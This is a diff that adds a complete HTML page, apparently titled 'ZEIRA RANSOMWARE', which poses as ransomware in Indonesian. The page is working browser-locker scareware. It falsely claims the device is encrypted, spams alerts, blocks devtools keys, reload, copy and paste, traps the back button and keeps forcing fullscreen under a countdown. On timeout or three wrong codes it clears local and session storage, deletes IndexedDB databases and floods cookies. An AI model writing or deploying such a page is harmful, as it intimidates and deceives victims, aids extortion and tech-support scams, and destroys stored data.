@@ -1,0 +1,285 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>ZEIRA RANSOMWARE</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            background: #000;
+            overflow: hidden;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            font-family: monospace;
+        }
+        .lock-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            z-index: 999999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            animation: pulse 0.15s infinite;
+        }
+        @keyframes pulse {
+            0% { background: #000; }
+            50% { background: #2a0000; }
+            100% { background: #000; }
+        }
+        .card {
+            background: #0a0a0a;
+            border: 4px solid #ff0000;
+            border-radius: 50px;
+            padding: 40px 30px;
+            text-align: center;
+            max-width: 90%;
+            width: 380px;
+            animation: borderPulse 0.3s infinite;
+            box-shadow: 0 0 70px rgba(255,0,0,0.5);
+        }
+        @keyframes borderPulse {
+            0% { border-color: #ff0000; box-shadow: 0 0 20px red; }
+            50% { border-color: #ff4444; box-shadow: 0 0 60px red; }
+            100% { border-color: #ff0000; box-shadow: 0 0 20px red; }
+        }
+        h1 {
+            color: #ff0000;
+            font-size: 28px;
+            margin-bottom: 15px;
+            text-shadow: 0 0 10px red;
+            animation: shake 0.3s infinite;
+        }
+        @keyframes shake {
+            0%,100% { transform: translateX(0); }
+            25% { transform: translateX(-2px); }
+            75% { transform: translateX(2px); }
+        }
+        .skull {
+            font-size: 50px;
+            margin-bottom: 10px;
+            animation: zoom 0.5s infinite;
+        }
+        @keyframes zoom {
+            0%,100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        p {
+            color: #ff8888;
+            margin: 15px 0;
+            font-size: 14px;
+        }
+        .code-input {
+            width: 100%;
+            padding: 18px;
+            background: #111;
+            border: 2px solid #ff0000;
+            border-radius: 60px;
+            color: #00ff00;
+            font-size: 28px;
+            text-align: center;
+            letter-spacing: 8px;
+            margin: 20px 0;
+            font-family: monospace;
+            font-weight: bold;
+        }
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(90deg, #ff0000, #cc0000);
+            border: none;
+            border-radius: 60px;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .timer {
+            color: #ffaa00;
+            font-size: 16px;
+            margin-top: 15px;
+            font-weight: bold;
+        }
+        .warning {
+            font-size: 10px;
+            color: #ff6666;
+            margin-top: 15px;
+        }
+        .blink {
+            animation: blinkText 0.8s infinite;
+        }
+        @keyframes blinkText {
+            0%,100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+    </style>
+</head>
+<body>
+<div class="lock-screen" id="lockScreen">
+    <div class="card">
+        <div class="skull">💀☠️💀</div>
+        <h1>ZEIRA RANSOMWARE</h1>
+        <p>⚠️ PERANGKAT ANDA TELAH DIENKRIPSI ⚠️</p>
+        <p style="font-size:12px;">Tidak bisa keluar. Semua data akan dihapus.<br>Masukkan kode untuk menyelamatkan.</p>
+        <input type="password" class="code-input" id="codeInput" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">
+        <button id="unlockBtn">🔓 DEKRIPSI & SELAMATKAN 🔓</button>
+        <div class="timer" id="timerDisplay">⏰ Sisa waktu: 59 detik</div>
+        <div class="warning blink">💀 KESALAHAN 3X = DATA HANCUR PERMANEN 💀</div>
+    </div>
+</div>
+
+<script>
+    const CORRECT_CODE = "0000";
+    let attempts = 0;
+    let timeLeft = 60;
+    let locked = true;
+    let timerInterval = null;
+    let alertInterval = null;
+    let fullscreenInterval = null;
+
+    const lockScreen = document.getElementById('lockScreen');
+    const codeInput = document.getElementById('codeInput');
+    const unlockBtn = document.getElementById('unlockBtn');
+    const timerDisplay = document.getElementById('timerDisplay');
+
+    // BLOKIR SEMUA CARA KELUAR
+    function blockEverything() {
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            const blocked = ['F12', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11'];
+            if(blocked.includes(e.key)) { e.preventDefault(); return false; }
+            if(e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 'r' || e.key === 'R')) { e.preventDefault(); return false; }
+            if(e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) { e.preventDefault(); return false; }
+        });
+        
+        history.pushState(null, null, location.href);
+        window.onpopstate = () => { history.pushState(null, null, location.href); return false; };
+        window.onbeforeunload = () => locked ? "🔒 JANGAN KELUAR! Data akan hancur!" : null;
+        
+        document.addEventListener('copy', e => e.preventDefault());
+        document.addEventListener('paste', e => e.preventDefault());
+        document.addEventListener('cut', e => e.preventDefault());
+        
+        function forceFullscreen() {
+            if(locked && !document.fullscreenElement && !document.webkitFullscreenElement) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            }
+        }
+        forceFullscreen();
+        fullscreenInterval = setInterval(forceFullscreen, 800);
+        
+        window.addEventListener('scroll', () => window.scrollTo(0, 0));
+        document.body.style.overflow = 'hidden';
+    }
+    
+    // ALERT SPAM
+    function startAlertSpam() {
+        alertInterval = setInterval(() => {
+            if(locked) alert("🔴 ZEIRA RANSOMWARE 🔴\nMasukkan kode 0000 untuk menyelamatkan data!\nPercobaan salah 3x = data hancur!");
+        }, 2500);
+    }
+    
+    // TIMER
+    function startTimer() {
+        timerInterval = setInterval(() => {
+            if(!locked) return;
+            if(timeLeft <= 0) {
+                clearAllIntervals();
+                destroyAllData();
+            } else {
+                timeLeft--;
+                timerDisplay.innerHTML = `⏰ Sisa waktu: ${timeLeft} detik`;
+                if(timeLeft <= 10) {
+                    timerDisplay.style.color = "#ff0000";
+                    timerDisplay.style.fontSize = "20px";
+                }
+            }
+        }, 1000);
+    }
+    
+    function clearAllIntervals() {
+        if(timerInterval) clearInterval(timerInterval);
+        if(alertInterval) clearInterval(alertInterval);
+        if(fullscreenInterval) clearInterval(fullscreenInterval);
+    }
+    
+    // HANCURKAN DATA
+    function destroyAllData() {
+        locked = false;
+        try {
+            localStorage.clear();
+            sessionStorage.clear();
+            for(let i=0; i<2000; i++) {
+                document.cookie = `zeira_kill_${i}=${'X'.repeat(5000)}; path=/`;
+            }
+            try { indexedDB.deleteDatabase("zeira_db"); } catch(e) {}
+            try { indexedDB.deleteDatabase("user_data"); } catch(e) {}
+        } catch(e) {}
+        
+        document.body.innerHTML = `
+            <div style="background:#000; color:#ff0000; text-align:center; padding:50px; height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column;">
+                <h1 style="font-size:40px;">💀 DATA HANCUR PERMANEN 💀</h1>
+                <p style="color:#ff6666; margin-top:25px;">Semua data telah dihapus.</p>
+                <p style="color:#ff6666;">Tidak dapat dipulihkan kembali.</p>
+                <p style="color:#ffaa00; margin-top:35px;">ZEIRA RANSOMWARE - NO RETURN</p>
+            </div>
+        `;
+        
+        setInterval(() => { alert("💀 DATA ANDA TELAH DIHANCURKAN PERMANEN 💀"); }, 1500);
+    }
+    
+    // UNLOCK
+    function unlock() {
+        const code = codeInput.value;
+        if(code === CORRECT_CODE) {
+            locked = false;
+            clearAllIntervals();
+            if(document.exitFullscreen) document.exitFullscreen();
+            window.onbeforeunload = null;
+            alert("✅ KODE BENAR! Sistem akan dipulihkan.");
+            document.body.innerHTML = `
+                <div style="background:#000; color:#00ff41; text-align:center; padding:50px; height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column;">
+                    <h1 style="font-size:36px;">✅ SISTEM DIPULIHKAN ✅</h1>
+                    <p style="color:#00ff88; margin-top:20px;">Data Anda telah didekripsi.</p>
+                    <p style="color:#00ff88;">Perangkat kembali normal.</p>
+                    <button onclick="location.reload()" style="margin-top:35px; padding:14px 40px; background:#00ff41; border:none; border-radius:40px; cursor:pointer; font-weight:bold;">SELESAI</button>
+                </div>
+            `;
+        } else {
+            attempts++;
+            if(attempts >= 3) {
+                clearAllIntervals();
+                alert("💀 KESALAHAN 3X! DATA AKAN DIHANCURKAN!");
+                destroyAllData();
+            } else {
+                alert(`❌ KODE SALAH! Sisa percobaan: ${3 - attempts}`);
+                codeInput.value = "";
+                codeInput.focus();
+                if(navigator.vibrate) navigator.vibrate(300);
+            }
+        }
+    }
+    
+    // INIT
+    blockEverything();
+    startAlertSpam();
+    startTimer();
+    unlockBtn.onclick = unlock;
+    codeInput.onkeypress = (e) => { if(e.key === 'Enter') unlock(); };
+    codeInput.focus();
+</script>
+</body>
+</html>
